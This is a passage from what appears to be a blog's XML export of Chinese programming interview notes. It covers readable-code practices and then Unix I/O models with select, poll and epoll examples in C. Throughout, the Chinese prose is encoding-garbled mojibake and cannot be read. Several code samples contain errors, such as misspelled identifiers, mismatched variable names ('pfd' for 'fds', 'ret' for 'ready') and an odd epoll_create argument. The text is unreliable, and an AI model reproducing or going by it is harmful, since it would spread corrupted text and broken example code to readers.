å…«ã€æ‹†åˆ†é•¿è¡¨è¾¾å¼é•¿è¡¨è¾¾å¼çš„å¯è¯»æ€§å¾ˆå·®ï¼Œå¯ä»¥å¼•å…¥ä¸€äº›è§£é‡Šå˜é‡ä»è€Œæ‹†åˆ†è¡¨è¾¾å¼ï¼š 12if line.split(':')[0].strip() == "root": ... 123username = line.split(':')[0].strip()if username == "root": ... ä½¿ç”¨æ‘©æ ¹å®šç†ç®€åŒ–ä¸€äº›é€»è¾‘è¡¨è¾¾å¼ï¼š 123if (!a &amp;&amp; !b) &#123; ...&#125; 123if (!(a || b)) &#123; ...&#125; ä¹ã€å˜é‡ä¸å¯è¯»æ€§å»é™¤æ§åˆ¶æµå˜é‡ ã€‚åœ¨å¾ªç¯ä¸­é€šè¿‡ä½¿ç”¨ break æˆ–è€… return å¯ä»¥å‡å°‘æ§åˆ¶æµå˜é‡çš„ä½¿ç”¨ã€‚ 12345678boolean done = false;while (/* condition */ &amp;&amp; !done) &#123; ... if ( ... ) &#123; done = true; continue; &#125;&#125; 123456while(/* condition */) &#123; ... if ( ... ) &#123; break; &#125;&#125; å‡å°å˜é‡ä½œç”¨åŸŸ ã€‚ä½œç”¨åŸŸè¶Šå°ï¼Œè¶Šå®¹æ˜“å®šä½åˆ°å˜é‡æ‰€æœ‰ä½¿ç”¨çš„åœ°æ–¹ã€‚ JavaScript å¯ä»¥ç”¨é—­åŒ…å‡å°ä½œç”¨åŸŸã€‚ä»¥ä¸‹ä»£ç ä¸­ submit_form æ˜¯å‡½æ•°å˜é‡ï¼Œsubmitted å˜é‡æ§åˆ¶å‡½æ•°ä¸ä¼šè¢«æäº¤ä¸¤æ¬¡ã€‚ç¬¬ä¸€ä¸ªå®ç°ä¸­ submitted æ˜¯å…¨å±€å˜é‡ï¼Œç¬¬äºŒä¸ªå®ç°æŠŠ submitted æ”¾åˆ°åŒ¿åå‡½æ•°ä¸­ï¼Œä»è€Œé™åˆ¶äº†èµ·ä½œç”¨åŸŸèŒƒå›´ã€‚ 1234567submitted = false;var submit_form = function(form_name) &#123; if (submitted) &#123; return; &#125; submitted = true;&#125;; 123456789var submit_form = (function() &#123; var submitted = false; return function(form_name) &#123; if(submitted) &#123; return; &#125; submitted = true; &#125;&#125;()); // () ä½¿å¾—å¤–å±‚åŒ¿åå‡½æ•°ç«‹å³æ‰§è¡Œ JavaScript ä¸­æ²¡æœ‰ç”¨ var å£°æ˜çš„å˜é‡éƒ½æ˜¯å…¨å±€å˜é‡ï¼Œè€Œå…¨å±€å˜é‡å¾ˆå®¹æ˜“é€ æˆè¿·æƒ‘ï¼Œå› æ­¤åº”å½“æ€»æ˜¯ç”¨ var æ¥å£°æ˜å˜é‡ã€‚ å˜é‡å®šä¹‰çš„ä½ç½®åº”å½“ç¦»å®ƒä½¿ç”¨çš„ä½ç½®æœ€è¿‘ã€‚ å®ä¾‹è§£æ åœ¨ä¸€ä¸ªç½‘é¡µä¸­æœ‰ä»¥ä¸‹æ–‡æœ¬è¾“å…¥å­—æ®µï¼š 1234&lt;input type = "text" id = "input1" value = "a"&gt;&lt;input type = "text" id = "input2" value = "b"&gt;&lt;input type = "text" id = "input3" value = ""&gt;&lt;input type = "text" id = "input4" value = "d"&gt; ç°åœ¨è¦æ¥å—ä¸€ä¸ªå­—ç¬¦ä¸²å¹¶æŠŠå®ƒæ”¾åˆ°ç¬¬ä¸€ä¸ªç©ºçš„ input å­—æ®µä¸­ï¼Œåˆå§‹å®ç°å¦‚ä¸‹ï¼š 123456789101112131415var setFirstEmptyInput = function(new_alue) &#123; var found = false; var i = 1; var elem = document.getElementById('input' + i); while (elem != null) &#123; if (elem.value === '') &#123; found = true; break; &#125; i++; elem = document.getElementById('input' + i); &#125; if (found) elem.value = new_value; return elem;&#125; ä»¥ä¸Šå®ç°æœ‰ä»¥ä¸‹é—®é¢˜ï¼š found å¯ä»¥å»é™¤ï¼› elem ä½œç”¨åŸŸè¿‡å¤§ï¼› å¯ä»¥ç”¨ for å¾ªç¯ä»£æ›¿ while å¾ªç¯ï¼› 123456789101112var setFirstEmptyInput = function(new_value) &#123; for (var i = 1; true; i++) &#123; var elem = document.getElementById('input' + i); if (elem === null) &#123; return null; &#125; if (elem.value === '') &#123; elem.value = new_value; return elem; &#125; &#125;&#125;; åã€æŠ½å–å‡½æ•°å·¥ç¨‹å­¦å°±æ˜¯æŠŠå¤§é—®é¢˜æ‹†åˆ†æˆå°é—®é¢˜å†æŠŠè¿™äº›é—®é¢˜çš„è§£å†³æ–¹æ¡ˆæ”¾å›ä¸€èµ·ã€‚ é¦–å…ˆåº”è¯¥æ˜ç¡®ä¸€ä¸ªå‡½æ•°çš„é«˜å±‚æ¬¡ç›®æ ‡ï¼Œç„¶åå¯¹äºä¸æ˜¯ç›´æ¥ä¸ºäº†è¿™ä¸ªç›®æ ‡å·¥ä½œçš„ä»£ç ï¼ŒæŠ½å–å‡ºæ¥æ”¾åˆ°ç‹¬ç«‹çš„å‡½æ•°ä¸­ã€‚ ä»‹ç»æ€§çš„ä»£ç ï¼š 12345678910111213141516int findClostElement(int[] arr) &#123; int clostIdx; int clostDist = Interger.MAX_VALUE; for (int i = 0; i &lt; arr.length; i++) &#123; int x = ...; int y = ...; int z = ...; int value = x * y * z; int dist = Math.sqrt(Math.pow(value, 2), Math.pow(arr[i], 2)); if (dist &lt; clostDist) &#123; clostIdx = i; clostDist = value; &#125; &#125; return clostIdx;&#125; ä»¥ä¸Šä»£ç ä¸­å¾ªç¯éƒ¨åˆ†ä¸»è¦è®¡ç®—è·ç¦»ï¼Œè¿™éƒ¨åˆ†ä¸å±äºä»£ç é«˜å±‚æ¬¡ç›®æ ‡ï¼Œé«˜å±‚æ¬¡ç›®æ ‡æ˜¯å¯»æ‰¾æœ€å°è·ç¦»çš„å€¼ï¼Œå› æ­¤å¯ä»¥æŠŠè¿™éƒ¨åˆ†ä»£æ›¿æå–åˆ°ç‹¬ç«‹çš„å‡½æ•°ä¸­ã€‚è¿™æ ·åšä¹Ÿå¸¦æ¥ä¸€ä¸ªé¢å¤–çš„å¥½å¤„æœ‰ï¼šå¯ä»¥å•ç‹¬è¿›è¡Œæµ‹è¯•ã€å¯ä»¥å¿«é€Ÿæ‰¾åˆ°ç¨‹åºé”™è¯¯å¹¶ä¿®æ”¹ã€‚ 123456789101112public int findClostElement(int[] arr) &#123; int clostIdx; int clostDist = Interger.MAX_VALUE; for (int i = 0; i &lt; arr.length; i++) &#123; int dist = computDist(arr, i); if (dist &lt; clostDist) &#123; clostIdx = i; clostDist = value; &#125; &#125; return clostIdx;&#125; å¹¶ä¸æ˜¯å‡½æ•°æŠ½å–çš„è¶Šå¤šè¶Šå¥½ï¼Œå¦‚æœæŠ½å–è¿‡å¤šï¼Œåœ¨é˜…è¯»ä»£ç çš„æ—¶å€™å¯èƒ½éœ€è¦ä¸æ–­è·³æ¥è·³å»ã€‚åªæœ‰åœ¨å½“å‰å‡½æ•°ä¸éœ€è¦å»äº†è§£æŸä¸€å—ä»£ç ç»†èŠ‚è€Œèƒ½å¤Ÿè¡¨è¾¾å…¶å†…å®¹æ—¶ï¼ŒæŠŠè¿™å—ä»£ç æŠ½å–æˆå­å‡½æ•°æ‰æ˜¯å¥½çš„ã€‚ å‡½æ•°æŠ½å–ä¹Ÿç”¨äºå‡å°ä»£ç çš„å†—ä½™ã€‚ åä¸€ã€ä¸€æ¬¡åªåšä¸€ä»¶äº‹åªåšä¸€ä»¶äº‹çš„ä»£ç å¾ˆå®¹æ˜“è®©äººçŸ¥é“å…¶è¦åšçš„äº‹ï¼› åŸºæœ¬æµç¨‹ï¼šåˆ—å‡ºä»£ç æ‰€åšçš„æ‰€æœ‰ä»»åŠ¡ï¼›æŠŠæ¯ä¸ªä»»åŠ¡æ‹†åˆ†åˆ°ä¸åŒçš„å‡½æ•°ï¼Œæˆ–è€…ä¸åŒçš„æ®µè½ã€‚ åäºŒã€ç”¨è‡ªç„¶è¯­è¨€è¡¨è¿°ä»£ç å…ˆç”¨è‡ªç„¶è¯­è¨€ä¹¦å†™ä»£ç é€»è¾‘ï¼Œä¹Ÿå°±æ˜¯ä¼ªä»£ç ï¼Œç„¶åå†å†™ä»£ç ï¼Œè¿™æ ·ä»£ç é€»è¾‘ä¼šæ›´æ¸…æ™°ã€‚ åä¸‰ã€å‡å°‘ä»£ç é‡ä¸è¦è¿‡åº¦è®¾è®¡ï¼Œç¼–ç è¿‡ç¨‹ä¼šæœ‰å¾ˆå¤šå˜åŒ–ï¼Œè¿‡åº¦è®¾è®¡çš„å†…å®¹åˆ°æœ€åå¾€å¾€æ˜¯æ— ç”¨çš„ã€‚ å¤šç”¨æ ‡å‡†åº“å®ç°ã€‚ å‚è€ƒèµ„æ–™ Dustin, Boswell, Trevor, ç­‰. ç¼–å†™å¯è¯»ä»£ç çš„è‰ºæœ¯ [M]. æœºæ¢°å·¥ä¸šå‡ºç‰ˆç¤¾, 2012.]]></content>
      <categories>
        <category>Github</category>
        <category>Interview-Notebook</category>
      </categories>
      <tags>
        <tag>æŠ€æœ¯</tag>
        <tag>Java</tag>
        <tag>è½¬è½½</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Socket]]></title>
    <url>%2F2018%2F07%2F04%2FJava%2FInterview%2FInterview-Notebook%2FSocket%2F</url>
    <content type="text"><![CDATA[ä¸€ã€I/O æ¨¡å‹ é˜»å¡å¼ I/O éé˜»å¡å¼ I/O I/O å¤ç”¨ ä¿¡å·é©±åŠ¨ I/O å¼‚æ­¥ I/O åŒæ­¥ I/O ä¸å¼‚æ­¥ I/O äº”å¤§ I/O æ¨¡å‹æ¯”è¾ƒ äºŒã€I/O å¤ç”¨ select poll epoll select å’Œ poll æ¯”è¾ƒ epoll å·¥ä½œæ¨¡å¼ åº”ç”¨åœºæ™¯ å‚è€ƒèµ„æ–™ ä¸€ã€I/O æ¨¡å‹ä¸€ä¸ªè¾“å…¥æ“ä½œé€šå¸¸åŒ…æ‹¬ä¸¤ä¸ªé˜¶æ®µï¼š ç­‰å¾…æ•°æ®å‡†å¤‡å¥½ ä»å†…æ ¸å‘è¿›ç¨‹å¤åˆ¶æ•°æ® å¯¹äºä¸€ä¸ªå¥—æ¥å­—ä¸Šçš„è¾“å…¥æ“ä½œï¼Œç¬¬ä¸€æ­¥é€šå¸¸æ¶‰åŠç­‰å¾…æ•°æ®ä»ç½‘ç»œä¸­åˆ°è¾¾ã€‚å½“æ‰€ç­‰å¾…åˆ†ç»„åˆ°è¾¾æ—¶ï¼Œå®ƒè¢«å¤åˆ¶åˆ°å†…æ ¸ä¸­çš„æŸä¸ªç¼“å†²åŒºã€‚ç¬¬äºŒæ­¥å°±æ˜¯æŠŠæ•°æ®ä»å†…æ ¸ç¼“å†²åŒºå¤åˆ¶åˆ°åº”ç”¨è¿›ç¨‹ç¼“å†²åŒºã€‚ Unix ä¸‹æœ‰äº”ç§ I/O æ¨¡å‹ï¼š é˜»å¡å¼ I/O éé˜»å¡å¼ I/O I/O å¤ç”¨ï¼ˆselect å’Œ pollï¼‰ ä¿¡å·é©±åŠ¨å¼ I/Oï¼ˆSIGIOï¼‰ å¼‚æ­¥ I/Oï¼ˆAIOï¼‰ é˜»å¡å¼ I/Oåº”ç”¨è¿›ç¨‹è¢«é˜»å¡ï¼Œç›´åˆ°æ•°æ®å¤åˆ¶åˆ°åº”ç”¨è¿›ç¨‹ç¼“å†²åŒºä¸­æ‰è¿”å›ã€‚ åº”è¯¥æ³¨æ„åˆ°ï¼Œåœ¨é˜»å¡çš„è¿‡ç¨‹ä¸­ï¼Œå…¶å®ƒç¨‹åºè¿˜å¯ä»¥æ‰§è¡Œï¼Œå› æ­¤é˜»å¡ä¸æ„å‘³ç€æ•´ä¸ªæ“ä½œç³»ç»Ÿéƒ½è¢«é˜»å¡ã€‚å› ä¸ºå…¶ä»–ç¨‹åºè¿˜å¯ä»¥æ‰§è¡Œï¼Œå› æ­¤ä¸æ¶ˆè€— CPU æ—¶é—´ï¼Œè¿™ç§æ¨¡å‹çš„æ‰§è¡Œæ•ˆç‡ä¼šæ¯”è¾ƒé«˜ã€‚ ä¸‹å›¾ä¸­ï¼Œrecvfrom ç”¨äºæ¥æ”¶ Socket ä¼ æ¥çš„æ•°æ®ï¼Œå¹¶å¤åˆ¶åˆ°åº”ç”¨è¿›ç¨‹çš„ç¼“å†²åŒº buf ä¸­ã€‚è¿™é‡ŒæŠŠ recvfrom() å½“æˆç³»ç»Ÿè°ƒç”¨ã€‚ 1ssize_t recvfrom(int sockfd, void *buf, size_t len, int flags, struct sockaddr *src_addr, socklen_t *addrlen); éé˜»å¡å¼ I/Oåº”ç”¨è¿›ç¨‹æ‰§è¡Œç³»ç»Ÿè°ƒç”¨ä¹‹åï¼Œå†…æ ¸è¿”å›ä¸€ä¸ªé”™è¯¯ç ã€‚åº”ç”¨è¿›ç¨‹å¯ä»¥ç»§ç»­æ‰§è¡Œï¼Œä½†æ˜¯éœ€è¦ä¸æ–­çš„æ‰§è¡Œç³»ç»Ÿè°ƒç”¨æ¥è·çŸ¥ I/O æ˜¯å¦å®Œæˆï¼Œè¿™ç§æ–¹å¼ç§°ä¸ºè½®è¯¢ï¼ˆpollingï¼‰ã€‚ ç”±äº CPU è¦å¤„ç†æ›´å¤šçš„ç³»ç»Ÿè°ƒç”¨ï¼Œå› æ­¤è¿™ç§æ¨¡å‹æ˜¯æ¯”è¾ƒä½æ•ˆçš„ã€‚ I/O å¤ç”¨ä½¿ç”¨ select æˆ–è€… poll ç­‰å¾…æ•°æ®ï¼Œå¹¶ä¸”å¯ä»¥ç­‰å¾…å¤šä¸ªå¥—æ¥å­—ä¸­çš„ä»»ä½•ä¸€ä¸ªå˜ä¸ºå¯è¯»ï¼Œè¿™ä¸€è¿‡ç¨‹ä¼šè¢«é˜»å¡ï¼Œå½“æŸä¸€ä¸ªå¥—æ¥å­—å¯è¯»æ—¶è¿”å›ã€‚ä¹‹åå†ä½¿ç”¨ recvfrom æŠŠæ•°æ®ä»å†…æ ¸å¤åˆ¶åˆ°è¿›ç¨‹ä¸­ã€‚ å®ƒå¯ä»¥è®©å•ä¸ªè¿›ç¨‹å…·æœ‰å¤„ç†å¤šä¸ª I/O äº‹ä»¶çš„èƒ½åŠ›ã€‚åˆè¢«ç§°ä¸º Event Driven I/Oï¼Œå³äº‹ä»¶é©±åŠ¨ I/Oã€‚ å¦‚æœä¸€ä¸ª Web æœåŠ¡å™¨æ²¡æœ‰ I/O å¤ç”¨ï¼Œé‚£ä¹ˆæ¯ä¸€ä¸ª Socket è¿æ¥éƒ½éœ€è¦åˆ›å»ºä¸€ä¸ªçº¿ç¨‹å»å¤„ç†ã€‚å¦‚æœåŒæ—¶æœ‰å‡ ä¸‡ä¸ªè¿æ¥ï¼Œé‚£ä¹ˆå°±éœ€è¦åˆ›å»ºç›¸åŒæ•°é‡çš„çº¿ç¨‹ã€‚å¹¶ä¸”ç›¸æ¯”äºå¤šè¿›ç¨‹å’Œå¤šçº¿ç¨‹æŠ€æœ¯ï¼ŒI/O å¤ç”¨ä¸éœ€è¦è¿›ç¨‹çº¿ç¨‹åˆ›å»ºå’Œåˆ‡æ¢çš„å¼€é”€ï¼Œç³»ç»Ÿå¼€é”€æ›´å°ã€‚ ä¿¡å·é©±åŠ¨ I/Oåº”ç”¨è¿›ç¨‹ä½¿ç”¨ sigaction ç³»ç»Ÿè°ƒç”¨ï¼Œå†…æ ¸ç«‹å³è¿”å›ï¼Œåº”ç”¨è¿›ç¨‹å¯ä»¥ç»§ç»­æ‰§è¡Œï¼Œä¹Ÿå°±æ˜¯è¯´ç­‰å¾…æ•°æ®é˜¶æ®µåº”ç”¨è¿›ç¨‹æ˜¯éé˜»å¡çš„ã€‚å†…æ ¸åœ¨æ•°æ®åˆ°è¾¾æ—¶å‘åº”ç”¨è¿›ç¨‹å‘é€ SIGIO ä¿¡å·ï¼Œåº”ç”¨è¿›ç¨‹æ”¶åˆ°ä¹‹ååœ¨ä¿¡å·å¤„ç†ç¨‹åºä¸­è°ƒç”¨ recvfrom å°†æ•°æ®ä»å†…æ ¸å¤åˆ¶åˆ°åº”ç”¨è¿›ç¨‹ä¸­ã€‚ ç›¸æ¯”äºéé˜»å¡å¼ I/O çš„è½®è¯¢æ–¹å¼ï¼Œä¿¡å·é©±åŠ¨ I/O çš„ CPU åˆ©ç”¨ç‡æ›´é«˜ã€‚ å¼‚æ­¥ I/Oè¿›è¡Œ aio_read ç³»ç»Ÿè°ƒç”¨ä¼šç«‹å³è¿”å›ï¼Œåº”ç”¨è¿›ç¨‹ç»§ç»­æ‰§è¡Œï¼Œä¸ä¼šè¢«é˜»å¡ï¼Œå†…æ ¸ä¼šåœ¨æ‰€æœ‰æ“ä½œå®Œæˆä¹‹åå‘åº”ç”¨è¿›ç¨‹å‘é€ä¿¡å·ã€‚ å¼‚æ­¥ I/O ä¸ä¿¡å·é©±åŠ¨ I/O çš„åŒºåˆ«åœ¨äºï¼Œå¼‚æ­¥ I/O çš„ä¿¡å·æ˜¯é€šçŸ¥åº”ç”¨è¿›ç¨‹ I/O å®Œæˆï¼Œè€Œä¿¡å·é©±åŠ¨ I/O çš„ä¿¡å·æ˜¯é€šçŸ¥åº”ç”¨è¿›ç¨‹å¯ä»¥å¼€å§‹ I/Oã€‚ åŒæ­¥ I/O ä¸å¼‚æ­¥ I/O åŒæ­¥ I/Oï¼šåº”ç”¨è¿›ç¨‹åœ¨è°ƒç”¨ recvfrom æ“ä½œæ—¶ä¼šé˜»å¡ã€‚ å¼‚æ­¥ I/Oï¼šä¸ä¼šé˜»å¡ã€‚ é˜»å¡å¼ I/Oã€éé˜»å¡å¼ I/Oã€I/O å¤ç”¨å’Œä¿¡å·é©±åŠ¨ I/O éƒ½æ˜¯åŒæ­¥ I/Oï¼Œè™½ç„¶éé˜»å¡å¼ I/O å’Œä¿¡å·é©±åŠ¨ I/O åœ¨ç­‰å¾…æ•°æ®é˜¶æ®µä¸ä¼šé˜»å¡ï¼Œä½†æ˜¯åœ¨ä¹‹åçš„å°†æ•°æ®ä»å†…æ ¸å¤åˆ¶åˆ°åº”ç”¨è¿›ç¨‹è¿™ä¸ªæ“ä½œä¼šé˜»å¡ã€‚ äº”å¤§ I/O æ¨¡å‹æ¯”è¾ƒå‰å››ç§ I/O æ¨¡å‹çš„ä¸»è¦åŒºåˆ«åœ¨äºç¬¬ä¸€ä¸ªé˜¶æ®µï¼Œè€Œç¬¬äºŒä¸ªé˜¶æ®µæ˜¯ä¸€æ ·çš„ï¼šå°†æ•°æ®ä»å†…æ ¸å¤åˆ¶åˆ°åº”ç”¨è¿›ç¨‹è¿‡ç¨‹ä¸­ï¼Œåº”ç”¨è¿›ç¨‹ä¼šè¢«é˜»å¡ã€‚ äºŒã€I/O å¤ç”¨select/poll/epoll éƒ½æ˜¯ I/O å¤šè·¯å¤ç”¨çš„å…·ä½“å®ç°ï¼Œselect å‡ºç°çš„æœ€æ—©ï¼Œä¹‹åæ˜¯ pollï¼Œå†æ˜¯ epollã€‚ select1int select(int n, fd_set *readfds, fd_set *writefds, fd_set *exceptfds, struct timeval *timeout); readset, writeset, exceptset å‚æ•°ï¼Œåˆ†åˆ«å¯¹åº”è¯»ã€å†™ã€å¼‚å¸¸æ¡ä»¶çš„æè¿°ç¬¦é›†åˆã€‚ timeout å‚æ•°å‘ŠçŸ¥å†…æ ¸ç­‰å¾…æ‰€æŒ‡å®šæè¿°ç¬¦ä¸­çš„ä»»ä½•ä¸€ä¸ªå°±ç»ªçš„æœ€é•¿æ—¶é—´ï¼› æˆåŠŸè°ƒç”¨è¿”å›ç»“æœå¤§äº 0ï¼›å‡ºé”™è¿”å›ç»“æœä¸º -1ï¼›è¶…æ—¶è¿”å›ç»“æœä¸º 0ã€‚ æ¯æ¬¡è°ƒç”¨ select éƒ½éœ€è¦å°† readfds, writefds, exceptfds é“¾è¡¨å†…å®¹å…¨éƒ¨ä»åº”ç”¨è¿›ç¨‹ç¼“å†²åŒºå¤åˆ¶åˆ°å†…æ ¸ç¼“å†²åŒºã€‚ è¿”å›ç»“æœä¸­å†…æ ¸å¹¶æ²¡æœ‰å£°æ˜ fd_set ä¸­å“ªäº›æè¿°ç¬¦å·²ç»å‡†å¤‡å¥½ï¼Œæ‰€ä»¥å¦‚æœè¿”å›å€¼å¤§äº 0 æ—¶ï¼Œåº”ç”¨è¿›ç¨‹éœ€è¦éå†æ‰€æœ‰çš„ fd_setã€‚ select æœ€å¤šæ”¯æŒ 1024 ä¸ªæè¿°ç¬¦ï¼Œå…¶ä¸­ 1024 ç”±å†…æ ¸çš„ FD_SETSIZE å†³å®šã€‚å¦‚æœéœ€è¦æ‰“ç ´è¯¥é™åˆ¶å¯ä»¥ä¿®æ”¹ FD_SETSIZEï¼Œç„¶åé‡æ–°ç¼–è¯‘å†…æ ¸ã€‚ 123456789101112131415161718192021222324252627282930313233343536fd_set fd_in, fd_out;struct timeval tv;// Reset the setsFD_ZERO( &amp;fd_in );FD_ZERO( &amp;fd_out );// Monitor sock1 for input eventsFD_SET( sock1, &amp;fd_in );// Monitor sock2 for output eventsFD_SET( sock2, &amp;fd_out );// Find out which socket has the largest numeric value as select requires itint largest_sock = sock1 &gt; sock2 ? sock1 : sock2;// Wait up to 10 secondstv.tv_sec = 10;tv.tv_usec = 0;// Call the selectint ret = select( largest_sock + 1, &amp;fd_in, &amp;fd_out, NULL, &amp;tv );// Check if select actually succeedif ( ret == -1 ) // report error and abortelse if ( ret == 0 ) // timeout; no event detectedelse&#123; if ( FD_ISSET( sock1, &amp;fd_in ) ) // input event on sock1 if ( FD_ISSET( sock2, &amp;fd_out ) ) // output event on sock2&#125; poll1int poll(struct pollfd *fds, unsigned int nfds, int timeout); 12345struct pollfd &#123; int fd; // æ–‡ä»¶æè¿°ç¬¦ short events; // ç›‘è§†çš„è¯·æ±‚äº‹ä»¶ short revents; // å·²å‘ç”Ÿçš„äº‹ä»¶&#125;; å®ƒå’Œ select åŠŸèƒ½åŸºæœ¬ç›¸åŒï¼ŒåŒæ ·éœ€è¦æ¯æ¬¡éƒ½å°†æè¿°ç¬¦ä»åº”ç”¨è¿›ç¨‹ç¼“å†²åŒºå¤åˆ¶åˆ°å†…æ ¸ç¼“å†²åŒºï¼Œè°ƒç”¨è¿”å›ååŒæ ·éœ€è¦è¿›è¡Œè½®è¯¢æ‰èƒ½çŸ¥é“å“ªäº›æè¿°ç¬¦å·²ç»å‡†å¤‡å¥½ã€‚ poll å–æ¶ˆäº† 1024 ä¸ªæè¿°ç¬¦æ•°é‡ä¸Šé™ï¼Œä½†æ˜¯æ•°é‡å¤ªå¤§ä»¥åä¸èƒ½ä¿è¯æ‰§è¡Œæ•ˆç‡ï¼Œå› ä¸ºå¤åˆ¶å¤§é‡å†…å­˜åˆ°å†…æ ¸ååˆ†ä½æ•ˆï¼Œæ‰€éœ€æ—¶é—´ä¸æè¿°ç¬¦æ•°é‡æˆæ­£æ¯”ã€‚ poll åœ¨æè¿°ç¬¦çš„é‡å¤åˆ©ç”¨ä¸Šæ¯” select çš„ fd_set ä¼šæ›´å¥½ã€‚ å¦‚æœåœ¨å¤šçº¿ç¨‹ä¸‹ï¼Œå¦‚æœä¸€ä¸ªçº¿ç¨‹å¯¹æŸä¸ªæè¿°ç¬¦è°ƒç”¨äº† poll ç³»ç»Ÿè°ƒç”¨ï¼Œä½†æ˜¯å¦ä¸€ä¸ªçº¿ç¨‹å…³é—­äº†è¯¥æè¿°ç¬¦ï¼Œä¼šå¯¼è‡´ poll è°ƒç”¨ç»“æœä¸ç¡®å®šï¼Œè¯¥é—®é¢˜åŒæ ·å‡ºç°åœ¨ select ä¸­ã€‚ 1234567891011121314151617181920212223242526272829// The structure for two eventsstruct pollfd fds[2];// Monitor sock1 for inputfds[0].fd = sock1;fds[0].events = POLLIN;// Monitor sock2 for outputfds[1].fd = sock2;fds[1].events = POLLOUT;// Wait 10 secondsint ret = poll( &amp;fds, 2, 10000 );// Check if poll actually succeedif ( ret == -1 ) // report error and abortelse if ( ret == 0 ) // timeout; no event detectedelse&#123; // If we detect the event, zero it out so we can reuse the structure if ( pfd[0].revents &amp; POLLIN ) pfd[0].revents = 0; // input event on sock1 if ( pfd[1].revents &amp; POLLOUT ) pfd[1].revents = 0; // output event on sock2&#125; epoll123int epoll_create(int size);int epoll_ctl(int epfd, int op, int fd, struct epoll_event *event)ï¼›int epoll_wait(int epfd, struct epoll_event * events, int maxevents, int timeout); epoll ä»…é€‚ç”¨äº Linux OSã€‚ å®ƒæ˜¯ select å’Œ poll çš„å¢å¼ºç‰ˆï¼Œæ›´åŠ çµæ´»è€Œä¸”æ²¡æœ‰æè¿°ç¬¦æ•°é‡é™åˆ¶ã€‚ å®ƒå°†ç”¨æˆ·å…³å¿ƒçš„æè¿°ç¬¦æ”¾åˆ°å†…æ ¸çš„ä¸€ä¸ªäº‹ä»¶è¡¨ä¸­ï¼Œä»è€Œåªéœ€è¦åœ¨ç”¨æˆ·è¿›ç¨‹ç¼“å†²åŒºå’Œå†…æ ¸ç¼“å†²åŒºæ‹·è´ä¸€æ¬¡ã€‚ select å’Œ poll æ–¹å¼ä¸­ï¼Œè¿›ç¨‹åªæœ‰åœ¨è°ƒç”¨ä¸€å®šçš„æ–¹æ³•åï¼Œå†…æ ¸æ‰å¯¹æ‰€æœ‰ç›‘è§†çš„æè¿°ç¬¦è¿›è¡Œæ‰«æã€‚è€Œ epoll äº‹å…ˆé€šè¿‡ epoll_ctl() æ¥æ³¨å†Œæè¿°ç¬¦ï¼Œä¸€æ—¦åŸºäºæŸä¸ªæè¿°ç¬¦å°±ç»ªæ—¶ï¼Œå†…æ ¸ä¼šé‡‡ç”¨ç±»ä¼¼ callback çš„å›è°ƒæœºåˆ¶ï¼Œè¿…é€Ÿæ¿€æ´»è¿™ä¸ªæè¿°ç¬¦ï¼Œå½“è¿›ç¨‹è°ƒç”¨ epoll_wait() æ—¶ä¾¿å¾—åˆ°é€šçŸ¥ã€‚ æ–°ç‰ˆæœ¬çš„ epoll_create(int size) å‚æ•° size ä¸èµ·ä»»ä½•ä½œç”¨ï¼Œåœ¨æ—§ç‰ˆæœ¬çš„ epoll ä¸­å¦‚æœæè¿°ç¬¦çš„æ•°é‡å¤§äº sizeï¼Œä¸ä¿è¯æœåŠ¡è´¨é‡ã€‚ epoll_ctl() æ‰§è¡Œä¸€æ¬¡ç³»ç»Ÿè°ƒç”¨ï¼Œç”¨äºå‘å†…æ ¸æ³¨å†Œæ–°çš„æè¿°ç¬¦æˆ–è€…æ˜¯æ”¹å˜æŸä¸ªæ–‡ä»¶æè¿°ç¬¦çš„çŠ¶æ€ã€‚å·²æ³¨å†Œçš„æè¿°ç¬¦åœ¨å†…æ ¸ä¸­ä¼šè¢«ç»´æŠ¤åœ¨ä¸€æ£µçº¢é»‘æ ‘ä¸Šï¼Œé€šè¿‡å›è°ƒå‡½æ•°å†…æ ¸ä¼šå°† I/O å‡†å¤‡å¥½çš„æè¿°ç¬¦åŠ å…¥åˆ°ä¸€ä¸ªé“¾è¡¨ä¸­ç®¡ç†ã€‚ epoll_wait() å–å‡ºåœ¨å†…æ ¸ä¸­é€šè¿‡é“¾è¡¨ç»´æŠ¤çš„ I/O å‡†å¤‡å¥½çš„æè¿°ç¬¦ï¼Œå°†ä»–ä»¬ä»å†…æ ¸å¤åˆ¶åˆ°åº”ç”¨è¿›ç¨‹ä¸­ï¼Œä¸éœ€è¦åƒ select/poll å¯¹æ³¨å†Œçš„æ‰€æœ‰æè¿°ç¬¦éå†ä¸€éã€‚ epoll å¯¹å¤šçº¿ç¨‹ç¼–ç¨‹æ›´æœ‰å‹å¥½ï¼ŒåŒæ—¶å¤šä¸ªçº¿ç¨‹å¯¹åŒä¸€ä¸ªæè¿°ç¬¦è°ƒç”¨äº† epoll_wait() ä¹Ÿä¸ä¼šäº§ç”Ÿåƒ select/poll çš„ä¸ç¡®å®šæƒ…å†µã€‚æˆ–è€…ä¸€ä¸ªçº¿ç¨‹è°ƒç”¨äº† epoll_wait() å¦ä¸€ä¸ªçº¿ç¨‹å…³é—­äº†åŒä¸€ä¸ªæè¿°ç¬¦ä¹Ÿä¸ä¼šäº§ç”Ÿä¸ç¡®å®šæƒ…å†µã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344// Create the epoll descriptor. Only one is needed per app, and is used to monitor all sockets.// The function argument is ignored (it was not before, but now it is), so put your favorite number hereint pollingfd = epoll_create( 0xCAFE );if ( pollingfd &lt; 0 ) // report error// Initialize the epoll structure in case more members are added in futurestruct epoll_event ev = &#123; 0 &#125;;// Associate the connection class instance with the event. You can associate anything// you want, epoll does not use this information. We store a connection class pointer, pConnection1ev.data.ptr = pConnection1;// Monitor for input, and do not automatically rearm the descriptor after the eventev.events = EPOLLIN | EPOLLONESHOT;// Add the descriptor into the monitoring list. We can do it even if another thread is// waiting in epoll_wait - the descriptor will be properly addedif ( epoll_ctl( epollfd, EPOLL_CTL_ADD, pConnection1-&gt;getSocket(), &amp;ev ) != 0 ) // report error// Wait for up to 20 events (assuming we have added maybe 200 sockets before that it may happen)struct epoll_event pevents[ 20 ];// Wait for 10 seconds, and retrieve less than 20 epoll_event and store them into epoll_event arrayint ready = epoll_wait( pollingfd, pevents, 20, 10000 );// Check if epoll actually succeedif ( ret == -1 ) // report error and abortelse if ( ret == 0 ) // timeout; no event detectedelse&#123; // Check if any events detected for ( int i = 0; i &lt; ret; i++ ) &#123; if ( pevents[i].events &amp; EPOLLIN ) &#123; // Get back our connection pointer Connection * c = (Connection*) pevents[i].data.ptr; c-&gt;handleReadEvent(); &#125; &#125;&#125; select å’Œ poll 